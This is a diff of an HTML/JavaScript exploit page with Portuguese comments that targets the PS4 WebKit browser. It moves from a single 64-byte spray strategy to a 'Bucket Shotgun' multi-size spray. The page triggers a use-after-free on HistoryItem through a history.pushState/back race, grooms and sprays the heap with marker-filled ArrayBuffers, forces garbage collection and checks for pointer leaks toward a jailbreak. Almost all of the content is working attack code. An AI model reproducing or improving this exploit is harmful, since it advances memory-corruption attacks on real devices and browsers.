@@ -2,19 +2,22 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - The "Lucky 64" Strategy</title>
+<title>PS4 WebKit - Bucket Shotgun</title>
 <style>
-    body { background-color: #101010; color: #00ff00; font-family: monospace; padding: 20px; font-size: 14px; }
-    button { padding: 20px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; border: 2px solid #0f0; background: #004400; color: #fff; margin-bottom: 10px; }
-    #log { border: 1px solid #333; padding: 10px; height: 450px; overflow-y: scroll; white-space: pre-wrap; background-color: #000; }
-    .success { background-color: #fff; color: #000; font-weight: bold; border: 5px solid #0f0; }
-    .partial { background-color: #ff0; color: #000; font-weight: bold; border: 5px solid #ff0; }
+    body { background-color: #050505; color: #00ff00; font-family: monospace; padding: 20px; }
+    button { 
+        padding: 20px; width: 100%; margin-bottom: 10px;
+        font-weight: bold; font-size: 16px; cursor: pointer; 
+        border: 2px solid #0f0; background: #003300; color: #fff;
+    }
+    #log { border: 1px solid #333; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
+    .pwned { background-color: #fff; color: #000; font-size: 1.5em; font-weight: bold; }
 </style>
 </head>
 <body>
-<h2>PS4 12.00 - Replicando o Sucesso "CCCC"</h2>
-<div id="status">Estratégia: Loop 48 + Timeout + ArrayBuffer(64)</div>
-<button onclick="runLucky64()">TENTAR REPRODUZIR SUCESSO</button>
+<h2>PS4 WebKit - Multi-Bucket Reclaim</h2>
+<div id="status">Alvo: HistoryItem (0x50) + Variações</div>
+<button onclick="runShotgunExploit()">INICIAR RECLAIM (BUCKET SHOTGUN)</button>
 <div id="log"></div>
 
 <script>
@@ -22,117 +25,133 @@ const logEl = document.getElementById("log");
 const statusEl = document.getElementById("status");
 
 function log(m) { 
-    logEl.textContent += `[${new Date().toLocaleTimeString()}] ${m}\n`;
+    const d = document.createElement("div");
+    d.textContent = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${m}`;
+    logEl.appendChild(d);
     logEl.scrollTop = logEl.scrollHeight;
 }
+
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-// Configuração baseada no seu sucesso anterior
-const BUFFER_SIZE = 64; 
-const MARKER = 0x41414141; // AAAA
-
+// Armazena os objetos para impedir o GC de limpar
 var keepAlive = [];
-var targetViews = []; // Para checar vazamento de memória
 
-async function runLucky64() {
-    logEl.textContent = "";
-    keepAlive = [];
-    targetViews = [];
-    statusEl.textContent = "Preparando...";
-
-    // 1. GROOMING (Igual ao teste do Bucket Shotgun)
-    log("1. Alocando 1500 buffers de 64 bytes...");
-    for(let i=0; i<1500; i++) {
-        let buf = new ArrayBuffer(BUFFER_SIZE);
+// Helper para criar Fake Objects visualmente identificáveis
+function createFakeObject(size, marker) {
+    try {
+        let buf = new ArrayBuffer(size);
         let view = new Uint32Array(buf);
-        view.fill(MARKER);
-        keepAlive.push(buf);
-        // Guardamos algumas views para verificar escrita (LEAK)
-        if(i % 2 === 0) targetViews.push(view);
+        // Preenche com o marcador (ex: 0x41414141)
+        for(let i=0; i<view.length; i++) {
+            view[i] = marker;
+        }
+        return buf;
+    } catch(e) { return null; }
+}
+
+async function runShotgunExploit() {
+    logEl.innerHTML = "";
+    keepAlive = [];
+    statusEl.innerText = "Preparando...";
+
+    // === DEFINIÇÃO DOS BUCKETS ===
+    // O alvo é 80 bytes. Vamos atacar os vizinhos de alocação.
+    const BUCKETS = [
+        { size: 80,  marker: 0x41414141 }, // 'AAAA' (Alvo exato)
+        { size: 96,  marker: 0x42424242 }, // 'BBBB' (Header +16)
+        { size: 64,  marker: 0x43434343 }, // 'CCCC' (Menor)
+        { size: 128, marker: 0x44444444 }  // 'DDDD' (Maior)
+    ];
+
+    log("1. Preparando Grooming (Pré-alocação)...");
+    // Aloca alguns objetos de cada tamanho para "aquecer" os buckets do bmalloc
+    for(let b of BUCKETS) {
+        for(let k=0; k<100; k++) keepAlive.push(createFakeObject(b.size, b.marker));
     }
     
-    // Swiss Cheese (Buracos para o UAF cair)
-    log("   -> Criando buracos (1 a cada 4)...");
+    // Libera 25% deles para criar buracos (Swiss Cheese)
+    // Isso ajuda o UAF a cair num lugar conhecido
     keepAlive = keepAlive.filter((_, i) => i % 4 !== 0);
 
-    // 2. TRIGGER UAF (Loop 48 - O Clássico)
-    log("2. Iniciando Loop UAF...");
+    // === TRIGGER UAF ===
+    log("2. Disparando UAF (Loop 48)...");
     
     let size = 977;
     const STEP = 14461;
 
+    // Loop corrigido para 48 (o 64 causava crash por exaustão)
     for(let i = 0; i < 48; i++) {
         let frag = "V".repeat(size); 
         history.pushState({}, "", "#" + frag);
         history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
         
-        // Gatilho via Timeout (Como no teste CCCC)
         if(i % 6 === 0) setTimeout(() => history.back(), 0);
         
-        // JANELA CRÍTICA
+        // MOMENTO CRÍTICO (Iteração final)
         if (i === 47) {
-            log(">>> [MOMENTO CRÍTICO] SPRAY <<<");
+            log(">>> SPRAY MULTI-BUCKET <<<");
             
-            // Libera o HistoryItem
+            // 1. Libera o HistoryItem
             setTimeout(() => history.back(), 0);
             
-            // Spray Massivo de 64 bytes
-            // Tentamos ser rápidos para pegar a vaga
-            for(let k=0; k<800; k++) {
-                let buf = new ArrayBuffer(BUFFER_SIZE);
-                let view = new Uint32Array(buf);
-                view.fill(MARKER);
-                keepAlive.push(buf);
-                targetViews.push(view);
-            }
+            // 2. Spray Imediato de TODOS os tamanhos
+            // Isso aumenta drasticamente a chance de acertar o bucket correto
+            doShotgunSpray(BUCKETS);
+            
+            // 3. Force GC (Crucial do psfree.mjs)
+            setTimeout(() => forceGC(), 20); 
+        } else {
+            size += STEP;
+            await sleep(5);
         }
-        
-        size += STEP;
-        await sleep(5);
     }
     
-    await sleep(300);
+    await sleep(400); // Espera o pó baixar
+    checkResult();
+}
 
-    // 3. ANÁLISE DUPLA (URL + BUFFER)
-    log("3. Analisando resultados...");
-    
+function doShotgunSpray(buckets) {
+    // Aloca 200 objetos de CADA tamanho
+    // Total: ~800 objetos injetados no milissegundo crítico
+    for(let k=0; k<200; k++) {
+        for(let b of buckets) {
+            keepAlive.push(createFakeObject(b.size, b.marker));
+        }
+    }
+}
+
+function forceGC() {
+    // Pressão de memória para limpar o lixo e validar o spray
+    for (let i = 0; i < 4; i++) new ArrayBuffer(8 * 1024 * 1024);
+}
+
+function checkResult() {
+    statusEl.innerText = "Analisando Memória...";
     let url = document.URL;
-    let urlChanged = false;
-    let leakFound = false;
-    let leakVal = "";
-
-    // CHECK A: A URL mudou para 'AAAA'? (Sucesso anterior)
-    if (url.indexOf("AAAA") !== -1) {
-        urlChanged = true;
-        log("!!! SINAL POSITIVO: URL CONTÉM 'AAAA' !!!");
-        log("Isso confirma que ocupamos o objeto (FakeObj).");
+    let found = false;
+    let markerFound = "";
+    
+    // Procura pelos nossos marcadores na URL
+    // Se o HistoryItem (container) foi sobrescrito, o ponteiro da string agora
+    // aponta para 0x41414141 (endereço inválido -> CRASH) ou dados lidos do nosso buffer.
+    
+    for(let i=0; i < url.length && i < 5000; i++) {
+        let c = url.charCodeAt(i);
+        if(c === 0x41) { found = true; markerFound = "AAAA (80 bytes)"; break; }
+        if(c === 0x42) { found = true; markerFound = "BBBB (96 bytes)"; break; }
+        if(c === 0x43) { found = true; markerFound = "CCCC (64 bytes)"; break; }
+        if(c === 0x44) { found = true; markerFound = "DDDD (128 bytes)"; break; }
     }
 
-    // CHECK B: Algum buffer mudou de valor? (O que precisamos para Jailbreak)
-    for(let i=0; i < targetViews.length; i++) {
-        let view = targetViews[i];
-        if(view[0] !== MARKER) {
-            leakFound = true;
-            leakVal = "0x" + view[0].toString(16).padStart(8,'0');
-            log(`!!! LEAK DETECTADO NO BUFFER ${i} !!!`);
-            log(`Valor: ${leakVal}`);
-            break;
-        }
-    }
-
-    // RESULTADO
-    if (leakFound) {
-        statusEl.className = "success";
-        statusEl.textContent = `PWNED! POINTER LEAK: ${leakVal}`;
-        log("\nCONCLUSÃO: TEMOS UM PONTEIRO! SALVE ESSE VALOR.");
-    } else if (urlChanged) {
-        statusEl.className = "partial";
-        statusEl.textContent = "SUCESSO PARCIAL (FakeObj)";
-        log("\nCONCLUSÃO: Controlamos o objeto, mas o navegador não escreveu nele.");
-        log("Estamos no caminho certo. Tente novamente para conseguir o Leak.");
+    if(found) {
+        log("!!! SUCESSO !!!");
+        log(`Bucket Vencedor: ${markerFound}`);
+        statusEl.innerText = "PWNED";
+        statusEl.className = "pwned";
     } else {
-        log("Falha: Ainda 'V'. A Race Condition não bateu.");
-        log("Sugestão: Tente clicar no botão novamente. O heap muda a cada tentativa.");
+        // Se ainda for V, verifica se o navegador está instável
+        log("Status: Objeto intacto ('V').");
+        log("Nota: Se o console crashar nos próximos segundos, o tamanho de 80 bytes funcionou (Crash = Sucesso de Escrita).");
     }
 }
 </script>
